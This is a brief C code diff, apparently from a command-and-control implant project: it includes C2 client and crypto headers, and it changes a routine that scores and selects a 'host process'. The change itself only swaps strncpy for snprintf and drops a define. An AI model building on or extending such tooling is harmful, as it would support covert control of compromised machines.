@@ -27,7 +27,6 @@
  * ============================================================================
  */
 
-#define _GNU_SOURCE
 #include "../c2_comms/c2_client.h"
 #include "../c2_comms/crypto.h"
 #include "../common/config.h"
@@ -207,7 +206,7 @@ static aegis_result_t select_host_process(aegis_proc_score_t *best,
 
     if (score > best->score) {
       best->pid = pid;
-      strncpy(best->comm, comm, sizeof(best->comm) - 1);
+      snprintf(best->comm, sizeof(best->comm), "%s", comm);
       best->score = score;
     }
   }
